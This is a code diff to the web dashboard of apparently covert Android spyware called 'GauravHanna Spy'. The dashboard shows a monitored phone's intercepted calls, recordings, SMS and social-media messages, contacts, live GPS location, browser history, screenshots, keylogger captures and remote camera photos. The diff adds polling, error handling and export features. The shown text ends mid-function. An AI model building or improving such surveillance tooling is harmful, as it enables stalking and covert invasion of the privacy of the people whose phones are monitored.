@@ -6,8 +6,8 @@
   <title>GauravHanna Spy - Dashboard</title>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
   <style>
-    /* (All existing CSS remains exactly as before) */
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
       font-family: 'Inter', sans-serif;
@@ -150,7 +150,7 @@
       color: black;
       box-shadow: 0 0 10px #0f0;
     }
-    img.screenshot-thumb { max-width: 150px; max-height: 150px; border-radius: 8px; margin: 5px; border: 1px solid #0f0; }
+    img.screenshot-thumb { max-width: 150px; max-height: 150px; border-radius: 8px; margin: 5px; border: 1px solid #0f0; cursor: pointer; }
     #map { height: 400px; border-radius: 20px; margin-bottom: 20px; border: 1px solid #0f0; background: #111; }
     .device-status { display: inline-block; padding: 4px 12px; border-radius: 20px; font-size: 12px; font-weight: 600; }
     .status-online { background: #0f0; color: black; }
@@ -182,11 +182,49 @@
       margin-top: 20px;
       display: none;
     }
+    .modal {
+      display: none;
+      position: fixed;
+      z-index: 1000;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0,0,0,0.9);
+    }
+    .modal-content {
+      margin: auto;
+      display: block;
+      max-width: 90%;
+      max-height: 90%;
+      margin-top: 50px;
+    }
+    .close-modal {
+      position: absolute;
+      top: 20px;
+      right: 35px;
+      color: #0f0;
+      font-size: 40px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    .loading {
+      text-align: center;
+      padding: 20px;
+      color: #0f0;
+    }
     @media (max-width: 768px) { .sidebar { width: 70px; } .sidebar a span { display: none; } .main-content { margin-left: 70px; } }
   </style>
 </head>
 <body>
   <canvas id="matrix-canvas"></canvas>
+  
+  <!-- Modal for image preview -->
+  <div id="imageModal" class="modal">
+    <span class="close-modal">&times;</span>
+    <img class="modal-content" id="modalImage">
+  </div>
+  
   <div class="sidebar">
     <div class="logo"><i class="fas fa-eye"></i><span> GauravHanna_Spy</span></div>
     <ul>
@@ -210,6 +248,7 @@
       <li><a href="#" data-tab="livecamera"><i class="fas fa-video"></i><span> Live Camera</span></a></li>
     </ul>
   </div>
+  
   <div class="main-content">
     <div class="top-bar">
       <h2>Welcome, <span id="userName">User</span></h2>
@@ -224,7 +263,9 @@
     <div id="dashboard" class="tab-content active">
       <div class="dashboard-card">
         <div class="card-title">Statistics</div>
-        <div class="stats-grid" id="statsGrid"></div>
+        <div class="stats-grid" id="statsGrid">
+          <div class="loading">Loading stats...</div>
+        </div>
       </div>
       <div class="dashboard-card">
         <div class="card-title">Recent Activity</div>
@@ -238,29 +279,102 @@
         <div class="card-title">Monitored Devices</div>
         <div class="table-responsive">
           <table id="devicesTable">
-            <thead>  …<th>Device Name</th><th>Model</th><th>Android Version</th><th>Status</th><th>Last Seen</th> </thead>
+            <thead><tr><th>Device Name</th><th>Model</th><th>Android Version</th><th>Status</th><th>Last Seen</th></tr></thead>
             <tbody></tbody>
-           </table>
+          </table>
         </div>
       </div>
     </div>
 
     <!-- Calls Tab -->
-    <div id="calls" class="tab-content"><div class="dashboard-card"><div class="card-title">Call Logs</div><div class="table-responsive"><table id="callsTable"><thead>  …<th>Contact</th><th>Number</th><th>Type</th><th>Duration</th><th>Time</th> </thead><tbody></tbody></table></div></div></div>
+    <div id="calls" class="tab-content">
+      <div class="dashboard-card">
+        <div class="card-title">Call Logs</div>
+        <div class="table-responsive">
+          <table id="callsTable">
+            <thead><tr><th>Contact</th><th>Number</th><th>Type</th><th>Duration</th><th>Time</th></tr></thead>
+            <tbody></tbody>
+          </table>
+        </div>
+      </div>
+    </div>
 
     <!-- Call Recordings Tab -->
-    <div id="recordings" class="tab-content"><div class="dashboard-card"><div class="card-title">Call Recordings</div><div class="table-responsive"><table id="recordingsTable"><thead>  …<th>Call ID</th><th>Duration</th><th>Time</th><th>Audio</th> </thead><tbody></tbody></table></div><p class="note" style="margin-top: 20px; color: #0f0;">Note: Call recording feature is under development. Android client will upload recordings when online.</p></div></div>
+    <div id="recordings" class="tab-content">
+      <div class="dashboard-card">
+        <div class="card-title">Call Recordings</div>
+        <div class="table-responsive">
+          <table id="recordingsTable">
+            <thead><tr><th>Call ID</th><th>Duration</th><th>Time</th><th>Audio</th></tr></thead>
+            <tbody></tbody>
+          </table>
+        </div>
+        <p class="note" style="margin-top: 20px; color: #0f0;">Note: Call recording feature is under development. Android client will upload recordings when online.</p>
+      </div>
+    </div>
 
     <!-- All Messages Tab -->
-    <div id="messages" class="tab-content"><div class="dashboard-card"><div class="card-title">All Messages</div><div class="table-responsive"><table id="messagesTable"><thead>  …<th>App</th><th>Contact</th><th>Message</th><th>Time</th> </thead><tbody></tbody></table></div></div></div>
+    <div id="messages" class="tab-content">
+      <div class="dashboard-card">
+        <div class="card-title">All Messages</div>
+        <div class="table-responsive">
+          <table id="messagesTable">
+            <thead><tr><th>App</th><th>Contact</th><th>Message</th><th>Time</th></tr></thead>
+            <tbody></tbody>
+          </table>
+        </div>
+      </div>
+    </div>
 
-    <!-- Social Media Tabs (filtered) -->
-    <div id="social-whatsapp" class="tab-content"><div class="dashboard-card"><div class="card-title"><i class="fab fa-whatsapp"></i> WhatsApp Messages</div><div class="table-responsive"><table class="social-table" data-app="whatsapp"><thead>  …<th>Contact</th><th>Message</th><th>Time</th> </thead><tbody></tbody></table></div></div></div>
-    <div id="social-instagram" class="tab-content"><div class="dashboard-card"><div class="card-title"><i class="fab fa-instagram"></i> Instagram Messages</div><div class="table-responsive"><table class="social-table" data-app="instagram"><thead>  …<th>Contact</th><th>Message</th><th>Time</th> </thead><tbody></tbody></table></div></div></div>
-    <div id="social-facebook" class="tab-content"><div class="dashboard-card"><div class="card-title"><i class="fab fa-facebook"></i> Facebook Messages</div><div class="table-responsive"><table class="social-table" data-app="facebook"><thead>  …<th>Contact</th><th>Message</th><th>Time</th> </thead><tbody></tbody></table></div></div></div>
+    <!-- Social Media Tabs -->
+    <div id="social-whatsapp" class="tab-content">
+      <div class="dashboard-card">
+        <div class="card-title"><i class="fab fa-whatsapp"></i> WhatsApp Messages</div>
+        <div class="table-responsive">
+          <table class="social-table" data-app="whatsapp">
+            <thead><tr><th>Contact</th><th>Message</th><th>Time</th></tr></thead>
+            <tbody></tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+    
+    <div id="social-instagram" class="tab-content">
+      <div class="dashboard-card">
+        <div class="card-title"><i class="fab fa-instagram"></i> Instagram Messages</div>
+        <div class="table-responsive">
+          <table class="social-table" data-app="instagram">
+            <thead><tr><th>Contact</th><th>Message</th><th>Time</th></tr></thead>
+            <tbody></tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+    
+    <div id="social-facebook" class="tab-content">
+      <div class="dashboard-card">
+        <div class="card-title"><i class="fab fa-facebook"></i> Facebook Messages</div>
+        <div class="table-responsive">
+          <table class="social-table" data-app="facebook">
+            <thead><tr><th>Contact</th><th>Message</th><th>Time</th></tr></thead>
+            <tbody></tbody>
+          </table>
+        </div>
+      </div>
+    </div>
 
     <!-- Contacts Tab -->
-    <div id="contacts" class="tab-content"><div class="dashboard-card"><div class="card-title">Contacts</div><div class="table-responsive"><table id="contactsTable"><thead>  …<th>Name</th><th>Number</th><th>Email</th> </thead><tbody></tbody></table></div></div></div>
+    <div id="contacts" class="tab-content">
+      <div class="dashboard-card">
+        <div class="card-title">Contacts</div>
+        <div class="table-responsive">
+          <table id="contactsTable">
+            <thead><tr><th>Name</th><th>Number</th><th>Email</th></tr></thead>
+            <tbody></tbody>
+          </table>
+        </div>
+      </div>
+    </div>
 
     <!-- Locations Tab -->
     <div id="locations" class="tab-content">
@@ -273,33 +387,94 @@
         <div id="map"></div>
         <div class="table-responsive">
           <table id="locationsTable">
-            <thead>  …<th>Address</th><th>Lat/Lng</th><th>Time</th> </thead>
+            <thead><tr><th>Address</th><th>Lat/Lng</th><th>Time</th></tr></thead>
             <tbody></tbody>
-           </table>
+          </table>
         </div>
       </div>
     </div>
 
     <!-- Browser Tab -->
-    <div id="browser" class="tab-content"><div class="dashboard-card"><div class="card-title">Browser History</div><div class="table-responsive"><table id="browserTable"><thead>  …<th>URL</th><th>Title</th><th>Visit Time</th><th>Frequency</th> </thead><tbody></tbody></table></div></div></div>
+    <div id="browser" class="tab-content">
+      <div class="dashboard-card">
+        <div class="card-title">Browser History</div>
+        <div class="table-responsive">
+          <table id="browserTable">
+            <thead><tr><th>URL</th><th>Title</th><th>Visit Time</th><th>Frequency</th></tr></thead>
+            <tbody></tbody>
+          </table>
+        </div>
+      </div>
+    </div>
 
     <!-- Screenshots Tab -->
-    <div id="screenshots" class="tab-content"><div class="dashboard-card"><div class="card-title">Screenshots</div><div id="screenshotsGrid" style="display: flex; flex-wrap: wrap; gap: 15px;"></div></div></div>
+    <div id="screenshots" class="tab-content">
+      <div class="dashboard-card">
+        <div class="card-title">Screenshots</div>
+        <div id="screenshotsGrid" style="display: flex; flex-wrap: wrap; gap: 15px;"></div>
+      </div>
+    </div>
 
     <!-- Keylogger Tab -->
-    <div id="keylogs" class="tab-content"><div class="dashboard-card"><div class="card-title">Keylogger Entries</div><div class="table-responsive"><table id="keylogsTable"><thead>  …<th>App</th><th>Text</th><th>Time</th> </thead><tbody></tbody></table></div></div></div>
+    <div id="keylogs" class="tab-content">
+      <div class="dashboard-card">
+        <div class="card-title">Keylogger Entries</div>
+        <div class="table-responsive">
+          <table id="keylogsTable">
+            <thead><tr><th>App</th><th>Text</th><th>Time</th></tr></thead>
+            <tbody></tbody>
+          </table>
+        </div>
+      </div>
+    </div>
 
     <!-- Keyword Alerts Tab -->
-    <div id="keywords" class="tab-content"><div class="dashboard-card"><div class="card-title">Keyword Alerts</div><div class="table-responsive"><table id="keywordsTable"><thead>  …<th>Keyword</th><th>Matched Text</th><th>App</th><th>Time</th> </thead><tbody></tbody></table></div></div></div>
+    <div id="keywords" class="tab-content">
+      <div class="dashboard-card">
+        <div class="card-title">Keyword Alerts</div>
+        <div class="table-responsive">
+          <table id="keywordsTable">
+            <thead><tr><th>Keyword</th><th>Matched Text</th><th>App</th><th>Time</th></tr></thead>
+            <tbody></tbody>
+          </table>
+        </div>
+      </div>
+    </div>
 
     <!-- Geofence Tab -->
-    <div id="geofence" class="tab-content"><div class="dashboard-card"><div class="card-title">Geofence Events</div><div class="table-responsive"><table id="geofenceTable"><thead>  …<th>Fence Name</th><th>Event</th><th>Center</th><th>Radius</th><th>Time</th> </thead><tbody></tbody></table></div></div></div>
+    <div id="geofence" class="tab-content">
+      <div class="dashboard-card">
+        <div class="card-title">Geofence Events</div>
+        <div class="table-responsive">
+          <table id="geofenceTable">
+            <thead><tr><th>Fence Name</th><th>Event</th><th>Center</th><th>Radius</th><th>Time</th></tr></thead>
+            <tbody></tbody>
+          </table>
+        </div>
+      </div>
+    </div>
 
     <!-- App Usage Tab -->
-    <div id="appusage" class="tab-content"><div class="dashboard-card"><div class="card-title">App Usage</div><div class="table-responsive"><table id="appusageTable"><thead>  …<th>App Name</th><th>Package</th><th>Foreground Time (sec)</th><th>Time</th> </thead><tbody></tbody></table></div></div></div>
+    <div id="appusage" class="tab-content">
+      <div class="dashboard-card">
+        <div class="card-title">App Usage</div>
+        <div class="table-responsive">
+          <table id="appusageTable">
+            <thead><tr><th>App Name</th><th>Package</th><th>Foreground Time (sec)</th><th>Time</th></tr></thead>
+            <tbody></tbody>
+          </table>
+        </div>
+      </div>
+    </div>
 
     <!-- Export Tab -->
-    <div id="export" class="tab-content"><div class="dashboard-card"><div class="card-title">Export Data</div><button id="exportBtn" class="btn-primary">Export All as CSV</button></div></div>
+    <div id="export" class="tab-content">
+      <div class="dashboard-card">
+        <div class="card-title">Export Data</div>
+        <button id="exportBtn" class="btn-primary">Export All as CSV</button>
+        <button id="exportJsonBtn" class="btn-outline" style="margin-left: 10px;">Export as JSON</button>
+      </div>
+    </div>
 
     <!-- Live Camera Tab -->
     <div id="livecamera" class="tab-content">
@@ -308,6 +483,7 @@
         <div style="margin-bottom: 20px;">
           <select id="cameraDeviceSelect" class="btn-outline" style="margin-right: 10px;"></select>
           <button id="takePhotoBtn" class="btn-primary">📸 Take Photo</button>
+          <button id="startPhotoPollingBtn" class="btn-outline">🔄 Auto Polling OFF</button>
         </div>
         <div id="cameraImageContainer" style="text-align: center;">
           <img id="latestPhoto" class="camera-preview">
@@ -382,40 +558,55 @@
     let token = localStorage.getItem('token');
     if (!token) window.location.href = 'login.html';
 
-    async function fetchAPI(endpoint) {
-      const res = await fetch(`${API_BASE}${endpoint}`, { headers: { 'Authorization': `Bearer ${token}` } });
-      return res.json();
+    // Helper function for API calls with error handling
+    async function fetchAPI(endpoint, options = {}) {
+      try {
+        const res = await fetch(`${API_BASE}${endpoint}`, {
+          ...options,
+          headers: {
+            'Content-Type': 'application/json',
+            'Authorization': `Bearer ${token}`,
+            ...options.headers
+          }
+        });
+        
+        if (res.status === 401) {
+          localStorage.removeItem('token');
+          window.location.href = 'login.html';
+          return null;
+        }
+        
+        const data = await res.json();
+        return data;
+      } catch (err) {
+        console.error(`API Error ${endpoint}:`, err);
+        return { success: false, error: err.message };
+      }
     }
 
     async function loadUser() {
       const data = await fetchAPI('/auth/me');
-      if (data.success) document.getElementById('userName').innerText = data.user.name;
+      if (data && data.success) {
+        document.getElementById('userName').innerText = data.user.name || 'Admin';
+      }
     }
 
-    // Helper to determine type from item
-    function getItemType(item) {
-      if (item.contactName) return 'Call';
-      if (item.message) return 'Message';
-      if (item.address) return 'Location';
-      if (item.text) return 'Keylog';
-      return 'Unknown';
-    }
-
-    // ----- DASHBOARD STATS -----
+    // Dashboard Stats
     async function loadDashboard() {
       const stats = await fetchAPI('/data/stats');
-      if (stats.success) {
+      if (stats && stats.success) {
         const s = stats.stats;
         document.getElementById('statsGrid').innerHTML = `
-          <div class="stat-box"><div class="stat-number">${s.totalDevices}</div><div>Devices</div></div>
-          <div class="stat-box"><div class="stat-number">${s.totalMessages}</div><div>Messages</div></div>
-          <div class="stat-box"><div class="stat-number">${s.totalCalls}</div><div>Calls</div></div>
-          <div class="stat-box"><div class="stat-number">${s.totalLocations}</div><div>Locations</div></div>
-          <div class="stat-box"><div class="stat-number">${s.totalScreenshots}</div><div>Screenshots</div></div>
+          <div class="stat-box"><div class="stat-number">${s.totalDevices || 0}</div><div>Devices</div></div>
+          <div class="stat-box"><div class="stat-number">${s.totalMessages || 0}</div><div>Messages</div></div>
+          <div class="stat-box"><div class="stat-number">${s.totalCalls || 0}</div><div>Calls</div></div>
+          <div class="stat-box"><div class="stat-number">${s.totalLocations || 0}</div><div>Locations</div></div>
+          <div class="stat-box"><div class="stat-number">${s.totalScreenshots || 0}</div><div>Screenshots</div></div>
         `;
       }
+      
       const recent = await fetchAPI('/data/recent');
-      if (recent.success && recent.data.length) {
+      if (recent && recent.success && recent.data && recent.data.length) {
         let html = '<div class="table-responsive"><table><thead><tr><th>Type</th><th>Details</th><th>Time</th></tr></thead><tbody>';
         recent.data.slice(0, 20).forEach(item => {
           let details = '';
@@ -423,7 +614,7 @@
           else if (item.message) details = `Message (${item.app || 'sms'}): ${item.message.substring(0, 50)}`;
           else if (item.address) details = `Location: ${item.address}`;
           else if (item.text) details = `Keylog: ${item.text.substring(0, 50)}`;
-          const type = getItemType(item);
+          const type = item.callType ? 'Call' : (item.message ? 'Message' : (item.address ? 'Location' : 'Keylog'));
           html += `<tr><td>${type}</td><td>${details}</td><td>${new Date(item.timestamp).toLocaleString()}</td></tr>`;
         });
         html += '</tbody></table></div>';
@@ -433,100 +624,145 @@
       }
     }
 
-    // ----- DEVICES -----
+    // Devices
     async function loadDevices() {
       const res = await fetchAPI('/data/devices');
-      if (res.success) {
+      if (res && res.success) {
         const tbody = document.querySelector('#devicesTable tbody');
         tbody.innerHTML = '';
-        res.data.forEach(device => {
-          const lastSeen = new Date(device.lastSeen);
-          const now = new Date();
-          const diffMinutes = (now - lastSeen) / 60000;
-          const isOnline = diffMinutes < 5;
-          const statusClass = isOnline ? 'status-online' : 'status-offline';
-          const statusText = isOnline ? 'Online' : 'Offline';
-          const row = `<tr>
-            <td>${device.deviceName || 'Unknown'}</td>
-            <td>${device.deviceModel || 'Unknown'}</td>
-            <td>${device.androidVersion || 'Unknown'}</td>
-            <td><span class="device-status ${statusClass}">${statusText}</span></td>
-            <td>${lastSeen.toLocaleString()}</td>
-          </tr>`;
-          tbody.insertAdjacentHTML('beforeend', row);
-        });
+        if (res.data && res.data.length) {
+          res.data.forEach(device => {
+            const lastSeen = new Date(device.lastSeen);
+            const now = new Date();
+            const diffMinutes = (now - lastSeen) / 60000;
+            const isOnline = diffMinutes < 5;
+            const statusClass = isOnline ? 'status-online' : 'status-offline';
+            const statusText = isOnline ? 'Online' : 'Offline';
+            const row = `<tr>
+              <td>${device.deviceName || 'Unknown'}</td>
+              <td>${device.deviceModel || 'Unknown'}</td>
+              <td>${device.androidVersion || 'Unknown'}</td>
+              <td><span class="device-status ${statusClass}">${statusText}</span></td>
+              <td>${lastSeen.toLocaleString()}</td>
+            </tr>`;
+            tbody.insertAdjacentHTML('beforeend', row);
+          });
+        } else {
+          tbody.innerHTML = '<tr><td colspan="5">No devices found</td></tr>';
+        }
       }
     }
 
-    // ----- CALLS -----
+    // Calls
     async function loadCalls() {
       const res = await fetchAPI('/data/calls');
-      if (res.success) {
+      if (res && res.success) {
         const tbody = document.querySelector('#callsTable tbody');
         tbody.innerHTML = '';
-        res.data.forEach(call => {
-          const row = `<tr><td>${call.contactName || ''}</td><td>${call.phoneNumber}</td><td>${call.callType}</td><td>${call.duration}s</td><td>${new Date(call.timestamp).toLocaleString()}</td></tr>`;
-          tbody.insertAdjacentHTML('beforeend', row);
-        });
+        if (res.data && res.data.length) {
+          res.data.forEach(call => {
+            const row = `<tr>
+              <td>${call.contactName || ''}</td>
+              <td>${call.phoneNumber || ''}</td>
+              <td>${call.callType || ''}</td>
+              <td>${call.duration || 0}s</td>
+              <td>${new Date(call.timestamp).toLocaleString()}</td>
+            </tr>`;
+            tbody.insertAdjacentHTML('beforeend', row);
+          });
+        } else {
+          tbody.innerHTML = '<tr><td colspan="5">No call logs found</td></tr>';
+        }
       }
     }
 
-    // ----- MESSAGES (cached) -----
+    // Messages
     let allMessages = [];
     async function loadMessages(appFilter = null) {
       if (allMessages.length === 0) {
         const res = await fetchAPI('/data/messages');
-        if (res.success) allMessages = res.data;
+        if (res && res.success) allMessages = res.data || [];
       }
-      if (appFilter) return allMessages.filter(msg => msg.app && msg.app.toLowerCase() === appFilter.toLowerCase());
+      if (appFilter) {
+        return allMessages.filter(msg => msg.app && msg.app.toLowerCase().includes(appFilter.toLowerCase()));
+      }
       return allMessages;
-    }
-
-    async function loadMessagesIntoTable(tableId, appFilter) {
-      const data = await loadMessages(appFilter);
-      const tbody = document.querySelector(`#${tableId} .social-table tbody`);
-      if (!tbody) return;
-      tbody.innerHTML = '';
-      data.forEach(msg => {
-        const row = `<tr><td>${msg.contactName || msg.contactNumber}</td><td>${msg.message}</td><td>${new Date(msg.timestamp).toLocaleString()}</td></tr>`;
-        tbody.insertAdjacentHTML('beforeend', row);
-      });
     }
 
     async function loadAllMessages() {
       const data = await loadMessages();
       const tbody = document.querySelector('#messagesTable tbody');
       tbody.innerHTML = '';
-      data.forEach(msg => {
-        const row = `<tr><td>${msg.app}</td><td>${msg.contactName || msg.contactNumber}</td><td>${msg.message}</td><td>${new Date(msg.timestamp).toLocaleString()}</td></tr>`;
-        tbody.insertAdjacentHTML('beforeend', row);
-      });
-    }
-
-    // ----- CONTACTS -----
-    async function loadContacts() {
-      const res = await fetchAPI('/data/contacts');
-      if (res.success) {
-        const tbody = document.querySelector('#contactsTable tbody');
-        tbody.innerHTML = '';
-        res.data.forEach(contact => {
-          const row = `<tr><td>${contact.name}</td><td>${contact.number}</td><td>${contact.email || ''}</td></tr>`;
+      if (data && data.length) {
+        data.forEach(msg => {
+          const row = `<tr>
+            <td>${msg.app || 'sms'}</td>
+            <td>${msg.contactName || msg.contactNumber || ''}</td>
+            <td>${msg.message || ''}</td>
+            <td>${new Date(msg.timestamp).toLocaleString()}</td>
+          </tr>`;
           tbody.insertAdjacentHTML('beforeend', row);
         });
+      } else {
+        tbody.innerHTML = '<tr><td colspan="4">No messages found</td></tr>';
       }
     }
 
-    // ----- LOCATIONS (map + live tracking) -----
+    async function loadMessagesIntoTable(tableId, appFilter) {
+      const data = await loadMessages(appFilter);
+      const container = document.querySelector(`#${tableId}`);
+      const tbody = container ? container.querySelector('.social-table tbody') : null;
+      if (!tbody) return;
+      tbody.innerHTML = '';
+      if (data && data.length) {
+        data.forEach(msg => {
+          const row = `<tr>
+            <td>${msg.contactName || msg.contactNumber || ''}</td>
+            <td>${msg.message || ''}</td>
+            <td>${new Date(msg.timestamp).toLocaleString()}</td>
+          </tr>`;
+          tbody.insertAdjacentHTML('beforeend', row);
+        });
+      } else {
+        tbody.innerHTML = '<tr><td colspan="3">No messages found</td></tr>';
+      }
+    }
+
+    // Contacts
+    async function loadContacts() {
+      const res = await fetchAPI('/data/contacts');
+      if (res && res.success) {
+        const tbody = document.querySelector('#contactsTable tbody');
+        tbody.innerHTML = '';
+        if (res.data && res.data.length) {
+          res.data.forEach(contact => {
+            const row = `<tr>
+              <td>${contact.name || ''}</td>
+              <td>${contact.number || ''}</td>
+              <td>${contact.email || ''}</td>
+            </tr>`;
+            tbody.insertAdjacentHTML('beforeend', row);
+          });
+        } else {
+          tbody.innerHTML = '<tr><td colspan="3">No contacts found</td></tr>';
+        }
+      }
+    }
+
+    // Locations with Map
     let map;
     let liveInterval = null;
     let latestMarker = null;
     let liveActive = false;
+    let locationData = [];
 
     async function loadLocations() {
       const res = await fetchAPI('/data/locations');
-      if (res.success && res.data.length) {
+      if (res && res.success && res.data && res.data.length) {
+        locationData = res.data;
         const tbody = document.querySelector('#locationsTable tbody');
         tbody.innerHTML = '';
+        
         if (!map) {
           map = L.map('map').setView([res.data[0].lat, res.data[0].lng], 12);
           L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { attribution: '© OpenStreetMap' }).addTo(map);
@@ -534,18 +770,28 @@
           map.eachLayer(layer => { if (layer instanceof L.Marker) map.removeLayer(layer); });
           latestMarker = null;
         }
+        
         res.data.forEach(loc => {
-          const row = `<tr><td>${loc.address || ''}</td><td>${loc.lat}, ${loc.lng}</td><td>${new Date(loc.timestamp).toLocaleString()}</td></tr>`;
+          const row = `<tr>
+            <td>${loc.address || ''}</td>
+            <td>${loc.lat}, ${loc.lng}</td>
+            <td>${new Date(loc.timestamp).toLocaleString()}</td>
+          </tr>`;
           tbody.insertAdjacentHTML('beforeend', row);
-          const marker = L.marker([loc.lat, loc.lng]).addTo(map).bindPopup(loc.address || 'Location');
-          if (!latestMarker || new Date(loc.timestamp) > new Date(latestMarker.options.timestamp)) {
+          
+          const marker = L.marker([loc.lat, loc.lng]).addTo(map).bindPopup(loc.address || `Location: ${loc.lat}, ${loc.lng}`);
+          if (!latestMarker || new Date(loc.timestamp) > new Date(latestMarker.options?.timestamp || 0)) {
             if (latestMarker) map.removeLayer(latestMarker);
             latestMarker = marker;
-            latestMarker.options.timestamp = loc.timestamp;
+            marker.options = { ...marker.options, timestamp: loc.timestamp };
           }
         });
+        
         if (res.data.length > 1) map.fitBounds(res.data.map(p => [p.lat, p.lng]));
-        if (latestMarker) latestMarker.setIcon(L.divIcon({ className: 'latest-marker', html: '📍', iconSize: [30, 30] }));
+        if (latestMarker) {
+          latestMarker.setIcon(L.divIcon({ className: 'latest-marker', html: '📍', iconSize: [30, 30] }));
+          latestMarker.openPopup();
+        }
       } else {
         if (map) map.remove();
         document.getElementById('map').innerHTML = '<p>No location data available.</p>';
@@ -553,24 +799,24 @@
     }
 
     async function centerOnLatest() {
-      const res = await fetchAPI('/data/locations');
-      if (res.success && res.data.length) {
-        const latest = res.data[0];
+      if (locationData.length > 0 && map) {
+        const latest = locationData[0];
         map.setView([latest.lat, latest.lng], 15);
-        if (latestMarker) map.removeLayer(latestMarker);
-        latestMarker = L.marker([latest.lat, latest.lng]).addTo(map).bindPopup(latest.address || 'Latest Location').openPopup();
-        latestMarker.options.timestamp = latest.timestamp;
+        if (latestMarker) {
+          latestMarker.openPopup();
+        }
       }
     }
 
     async function updateLiveLocation() {
       const res = await fetchAPI('/data/locations');
-      if (res.success && res.data.length) {
+      if (res && res.success && res.data && res.data.length && map) {
         const latest = res.data[0];
         if (latestMarker) map.removeLayer(latestMarker);
         latestMarker = L.marker([latest.lat, latest.lng]).addTo(map).bindPopup(latest.address || 'Latest Location').openPopup();
-        latestMarker.options.timestamp = latest.timestamp;
+        latestMarker.options = { ...latestMarker.options, timestamp: latest.timestamp };
         map.setView([latest.lat, latest.lng], map.getZoom());
+        locationData = res.data;
       }
     }
 
@@ -579,18 +825,22 @@
       liveInterval = setInterval(updateLiveLocation, 10000);
       liveActive = true;
       const btn = document.getElementById('liveTrackingBtn');
-      btn.innerHTML = '🔴 Live Tracking ON';
-      btn.style.background = '#0f0';
-      btn.style.color = 'black';
+      if (btn) {
+        btn.innerHTML = '🔴 Live Tracking ON';
+        btn.style.background = '#0f0';
+        btn.style.color = 'black';
+      }
     }
 
     function stopLiveTracking() {
       if (liveInterval) clearInterval(liveInterval);
       liveActive = false;
       const btn = document.getElementById('liveTrackingBtn');
-      btn.innerHTML = '🔴 Live Tracking OFF';
-      btn.style.background = '';
-      btn.style.color = '';
+      if (btn) {
+        btn.innerHTML = '🔴 Live Tracking OFF';
+        btn.style.background = '';
+        btn.style.color = '';
+      }
     }
 
     function toggleLiveTracking() {
@@ -598,93 +848,153 @@
       else startLiveTracking();
     }
 
-    // ----- BROWSER HISTORY -----
+    // Browser History
     async function loadBrowser() {
       const res = await fetchAPI('/data/browser');
-      if (res.success) {
+      if (res && res.success) {
         const tbody = document.querySelector('#browserTable tbody');
         tbody.innerHTML = '';
-        res.data.forEach(hist => {
-          const row = `<tr><td><a href="${hist.url}" target="_blank">${hist.url}</a></td><td>${hist.title}</td><td>${new Date(hist.visitTime).toLocaleString()}</td><td>${hist.frequency}</td></tr>`;
-          tbody.insertAdjacentHTML('beforeend', row);
-        });
+        if (res.data && res.data.length) {
+          res.data.forEach(hist => {
+            const row = `<tr>
+              <td><a href="${hist.url}" target="_blank" style="color:#0f0;">${hist.url.substring(0, 50)}</a></td>
+              <td>${hist.title || ''}</td>
+              <td>${new Date(hist.visitTime).toLocaleString()}</td>
+              <td>${hist.frequency || 1}</td>
+            </tr>`;
+            tbody.insertAdjacentHTML('beforeend', row);
+          });
+        } else {
+          tbody.innerHTML = '<tr><td colspan="4">No browser history found</td></tr>';
+        }
       }
     }
 
-    // ----- SCREENSHOTS -----
+    // Screenshots with Modal
     async function loadScreenshots() {
       const res = await fetchAPI('/data/screenshots');
-      if (res.success) {
+      if (res && res.success) {
         const grid = document.getElementById('screenshotsGrid');
         grid.innerHTML = '';
-        res.data.forEach(shot => {
-          const img = document.createElement('img');
-          img.src = shot.imageBase64;
-          img.classList.add('screenshot-thumb');
-          const div = document.createElement('div');
-          div.appendChild(img);
-          div.innerHTML += `<br><small>${new Date(shot.timestamp).toLocaleString()}</small>`;
-          grid.appendChild(div);
-        });
+        if (res.data && res.data.length) {
+          res.data.forEach(shot => {
+            const div = document.createElement('div');
+            div.style.textAlign = 'center';
+            const img = document.createElement('img');
+            img.src = shot.imageBase64.startsWith('data:') ? shot.imageBase64 : `data:image/jpeg;base64,${shot.imageBase64}`;
+            img.classList.add('screenshot-thumb');
+            img.onclick = () => {
+              const modal = document.getElementById('imageModal');
+              const modalImg = document.getElementById('modalImage');
+              modal.style.display = 'block';
+              modalImg.src = img.src;
+            };
+            div.appendChild(img);
+            const timeSpan = document.createElement('small');
+            timeSpan.innerText = new Date(shot.timestamp).toLocaleString();
+            timeSpan.style.display = 'block';
+            timeSpan.style.marginTop = '5px';
+            div.appendChild(timeSpan);
+            grid.appendChild(div);
+          });
+        } else {
+          grid.innerHTML = '<p>No screenshots available</p>';
+        }
       }
     }
 
-    // ----- KEYLOGS -----
+    // Keylogs
     async function loadKeylogs() {
       const res = await fetchAPI('/data/keylogs');
-      if (res.success) {
+      if (res && res.success) {
         const tbody = document.querySelector('#keylogsTable tbody');
         tbody.innerHTML = '';
-        res.data.forEach(log => {
-          const row = `<tr><td>${log.appPackage}</td><td>${log.text}</td><td>${new Date(log.timestamp).toLocaleString()}</td></tr>`;
-          tbody.insertAdjacentHTML('beforeend', row);
-        });
+        if (res.data && res.data.length) {
+          res.data.forEach(log => {
+            const row = `<tr>
+              <td>${log.appPackage || ''}</td>
+              <td>${log.text ? log.text.substring(0, 100) : ''}${log.text && log.text.length > 100 ? '...' : ''}</td>
+              <td>${new Date(log.timestamp).toLocaleString()}</td>
+            </tr>`;
+            tbody.insertAdjacentHTML('beforeend', row);
+          });
+        } else {
+          tbody.innerHTML = '<tr><td colspan="3">No keylogs found</td></tr>';
+        }
       }
     }
 
-    // ----- KEYWORD ALERTS -----
+    // Keyword Alerts
     async function loadKeywords() {
       const res = await fetchAPI('/data/keyword-alerts');
-      if (res.success) {
+      if (res && res.success) {
         const tbody = document.querySelector('#keywordsTable tbody');
         tbody.innerHTML = '';
-        res.data.forEach(alert => {
-          const row = `<tr><td>${alert.keyword}</td><td>${alert.matchedText}</td><td>${alert.app}</td><td>${new Date(alert.timestamp).toLocaleString()}</td></tr>`;
-          tbody.insertAdjacentHTML('beforeend', row);
-        });
+        if (res.data && res.data.length) {
